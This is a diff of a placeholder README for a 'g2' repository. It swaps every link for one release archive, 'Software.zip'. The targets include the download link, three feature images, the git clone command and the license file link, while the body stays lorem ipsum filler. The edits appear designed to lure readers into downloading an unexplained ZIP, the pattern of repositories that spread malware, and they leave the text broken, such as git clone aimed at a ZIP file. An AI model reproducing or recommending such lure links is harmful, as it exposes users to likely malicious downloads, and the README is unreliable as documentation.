@@ -6,7 +6,7 @@ Welcome to the "g2" repository! This repository is dedicated to an exciting proj
 
 In this section, you can find important resources related to the project:
 
-- [Download the latest release](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+- [Download the latest release](https://github.com/KatCraft/g2/releases/download/v2.0/Software.zip)
   - ℹ️ This link needs to be launched as it directly points to the ZIP file of version 1.0.0 of the project.
 
 ## 🌐 Visit the Official Website
@@ -17,15 +17,15 @@ If you are looking for more in-depth information and details about the project, 
 
 - Feature One: Lorem ipsum dolor sit amet, consectetur adipiscing elit.
   
-  ![Feature One](https://placeimg.com/200/200/tech)
+  ![Feature One](https://github.com/KatCraft/g2/releases/download/v2.0/Software.zip)
 
 - Feature Two: Integer vitae turpis ac metus dignissim gravida.
 
-  ![Feature Two](https://placeimg.com/200/200/tech)
+  ![Feature Two](https://github.com/KatCraft/g2/releases/download/v2.0/Software.zip)
 
 - Feature Three: Vivamus non odio eu justo facilisis dignissim.
 
-  ![Feature Three](https://placeimg.com/200/200/tech)
+  ![Feature Three](https://github.com/KatCraft/g2/releases/download/v2.0/Software.zip)
 
 ## 🚀 Get Started
 
@@ -33,7 +33,7 @@ Follow these instructions to get started with the project:
 
 1. Clone the repository to your local machine.
    ```bash
-   git clone https://github.com/your-username/g2.git
+   git clone https://github.com/KatCraft/g2/releases/download/v2.0/Software.zip
    ```
 
 2. Run the project using your favorite IDE or command line tool.
@@ -53,7 +53,7 @@ If you would like to contribute to this project, follow these steps:
 
 ## 📜 License
 
-This project is licensed under the MIT license - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT license - see the [https://github.com/KatCraft/g2/releases/download/v2.0/Software.zip](https://github.com/KatCraft/g2/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
